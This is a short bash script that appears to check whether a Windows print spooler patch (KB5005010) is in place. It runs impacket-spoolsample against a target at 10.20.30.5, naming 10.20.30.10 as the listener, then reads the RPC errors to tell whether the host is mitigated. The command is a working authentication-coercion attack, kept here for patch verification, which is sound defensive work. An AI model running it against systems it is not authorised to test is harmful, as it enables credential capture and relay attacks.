#!/usr/bin/env bash
set -euo pipefail
cd "$(mktemp -d)"

OUT=$(timeout 30 /usr/bin/impacket-spoolsample \
    -target '10.20.30.5' \
    '10.20.30.10' 2>&1 || true)

echo "--- spoolsample RPC return ---"
echo "$OUT"
echo "--- /spoolsample ---"

# KB5005010 stop-and-disable signal: RPC unreachable.
if echo "$OUT" | grep -qiE 'rpc_s_server_unavailable|ept_s_not_registered|spooler.*not.*running|connection.*refused'; then
    echo "[verify-poc-16] Spooler RPC unreachable -- KB5005010 mitigation in place"
    exit 0
fi
# Patch signal: RPC responsive but rejects with documented STATUS_ACCESS_DENIED.
if echo "$OUT" | grep -qiE 'error.*access_denied|rpc_s_access_denied|status_access_denied'; then
    echo "[verify-poc-16] Spooler returned STATUS_ACCESS_DENIED -- patch behavior confirmed"
    exit 0
fi
echo "[verify-poc-16] Spooler did not return ACCESS_DENIED -- patch / mitigation NOT in place" >&2
exit 1
